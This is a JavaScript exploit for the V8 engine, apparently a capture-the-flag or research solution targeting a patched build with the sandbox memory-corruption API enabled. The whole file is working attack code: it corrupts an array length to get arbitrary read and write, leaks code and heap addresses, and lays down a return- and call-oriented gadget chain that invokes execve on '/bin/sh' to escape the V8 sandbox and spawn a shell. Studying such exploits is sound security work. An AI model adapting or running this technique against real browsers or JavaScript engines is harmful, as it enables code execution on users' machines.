// based on 29131d5e3ea9cbfeae3e6dc3fd6c4439f0ac4bde with patch
// compiled with v8_enable_sandbox=true v8_expose_memory_curruption_api=true
// run with --jitless --no-expose-wasm

var conversion_buffer = new ArrayBuffer(8);
var f64_v = new Float64Array(conversion_buffer);
var u64_v = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function () {
	return "0x"+this.toString(16);
}
Number.prototype.hex = function () {
	return "0x"+this.toString(16);
}
BigInt.prototype.i2f = function () {
	u64_v[0] = this;
	return f64_v[0];
}
Number.prototype.f2i = function (){
	f64_v[0] = this;
	return u64_v[0];
}
var x = new ArrayBuffer(0x20);
var addr = Sandbox.getAddressOf(x);
var size = Sandbox.getSizeOf(x);
var a = new Sandbox.MemoryView(addr, 0x200);
var builtin_function = [Sandbox.getAddressOf];
var weak_aar_array = [1.1, 2.2, 3.3];

var f = new Float64Array(a);
//%DebugPrint(weak_aar_array);
//%DebugPrint(Sandbox.getAddressOf);

var weak_addr_getAddressOf = (f[0x15].f2i() & 0xffffffffn);
console.log("function addr: ", weak_addr_getAddressOf.hex());

// extend length
var temp = f[0x1d].f2i();
f[0x1d] = ((temp & 0xffffffff00000000n) | 0x1337n << 1n).i2f(); 
console.log("corrupted length: ", weak_aar_array.length.hex());

function weak_aar(weak_addr) {
	var temp = f[0x1c].f2i(); 
	f[0x1c] = ((temp & 0xffffffffn) | (weak_addr-8n) << 32n).i2f(); 
	return weak_aar_array[0].f2i() & 0xffffffffn;
}
function weak_aaw(weak_addr, value) {
	var temp = f[0x1c].f2i(); 
	f[0x1c] = ((temp & 0xffffffffn) | (weak_addr-8n) << 32n).i2f(); 
	weak_aar_array[0] = value.i2f();
}
function weak_aaw_bulk(weak_addr, arr) {
	var temp = f[0x1c].f2i(); 
	f[0x1c] = ((temp & 0xffffffffn) | (weak_addr-8n) << 32n).i2f(); 
	for (let i = 0; i < arr.length; i++) {
		weak_aar_array[i] = arr[i].i2f();
	}
}

var weak_addr_code = weak_aar(weak_addr_getAddressOf + 0x18n);
console.log("code: ", weak_addr_code.hex());

// get 64bit address from code_entry_point
var addr_code_entry_point = (weak_aar(weak_addr_code + 0x10n) << 32n) | weak_aar(weak_addr_code + 0xcn);
console.log("code_entry_point: ", addr_code_entry_point.hex());
var pie = addr_code_entry_point - 0x1053400n;
console.log("pie: ", pie.hex());
var heap_base = weak_aar(0x25n) << 32n;
console.log("heap_base: ", heap_base.hex());

var rax = pie + 0x01283db1n;
var rdx = pie + 0x01332b12n;
var rsi = pie + 0x00b0c71fn;
var rdi = pie + 0x013a484bn;
var syscall = pie + 0x01353a78n;

var gad0 = pie + 0x01320989n;	// mov rdi, [rdi+0x150]; mov rax, [rdi]; call qword ptr [rax+0x68];
var gad1 = pie + 0x00e1220fn;	// push rdi; pop rbp; call qword ptr [rbp+0x48];
var pivot = pie + 0x013a47b8n;	//: add rsp, 0x70; pop rbx; pop r14; pop rbp; ret;
var leave = pie + 0x011e6f43n;

var weak_rop_root = weak_addr_getAddressOf + 0x2000n;

// cop prep
weak_aaw(weak_addr_getAddressOf + 0x150n + 1n, heap_base + weak_rop_root);
weak_aaw(weak_rop_root + 1n, heap_base + weak_rop_root);
weak_aaw(weak_rop_root + 0x8n + 1n, pivot);

// place rop
var rop = [rdi, heap_base + weak_rop_root + 0xe0n, rsi, 0n, rdx, 0n, rax, 0x3bn, syscall, 29400045130965551n];
weak_aaw_bulk(weak_rop_root + 0x98n + 1n, rop);

// cop prep2
weak_aaw(weak_rop_root + 0x68n + 1n, gad1);
weak_aaw(weak_rop_root + 0x48n + 1n, leave);
weak_aaw(weak_addr_code + 0xcn, gad0);

// trigger forged function
Sandbox.getAddressOf();
